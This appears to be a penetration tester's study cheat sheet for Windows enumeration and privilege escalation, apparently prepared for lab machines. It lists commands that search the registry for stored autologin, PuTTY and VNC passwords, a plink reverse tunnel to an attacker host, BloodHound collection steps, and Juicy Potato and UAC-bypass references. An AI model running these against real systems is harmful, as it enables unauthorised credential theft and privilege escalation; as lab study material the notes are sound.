# Windows Survey and Privilege Escalation

System Information:
```
systeminfo
ver 
hostname
```

View the current user's information:
```
echo %username%
whoami
whoami /priv
whoami /all

# detailed account information and group memberships:
net user <USERNAME> 
```

Enumerate users and groups: 
```
# local machine
net user
net user <USERNAME>

# domain users 
net user /domain 
net user <USERNAME> /domain

# groups 
net groups
net groups /domain

page 627
```
Networking:
```
ipconfig
ipconfig /all
route print
arp -A
type C:\windows\system32\drivers\etc\networks

# display active TCP connections:
netstat -ano

# with executeanle 
netstat -bano
```


Firewall STatus:
```
#what is the new command?
netsh advfirewall show state
netsh advfirewall show config
```

Users and Groups 
```

#search through user directories

tree /f /a C:\Users\<USERNAME>

```

Password Searching:

Registry:

```
# windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

#VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

Search the HIVES:
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```


Running proceeses:
```
wmic process list brief
```

Set up port forwarding for services only available on the local machine:
```
# Port forward using plink
plink.exe -l <ATTACKER_USERNAME> -pw <ATTACKER_PASSOWRD> -R <ATTACKER_PORT>:127.0.0.1:<VICTIM_PORT> <ATTACKER_IP>

#The attacker port should provide access to the service from the attacker port on the attacker machine
```

<br /> 

Scripts: 
* winPEAS.bat
* windows-exploit-suggester.py
* WinEnum.ps1

Tools

## Bloodhound
```
#install
sudo apt install bloodhound 

#start bloodhound
bloodhound

#start neo4
neo4j console

#run sharphound on the target windows machine
./Sharphound.exe

#copy the zip file to your attacking machine, drag and drop into neo4j
```
Reference Sauna HTB machine

### Techniques 

UAC Bypass - https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/
Juicy Potato 
* must tell which CLSID to run or let it choose for you which may work 
** well known list for each OS - https://github.com/ohpe/juicy-potato/tree/master/CLSID

icacls - what files do we have read/write/execute abilites?



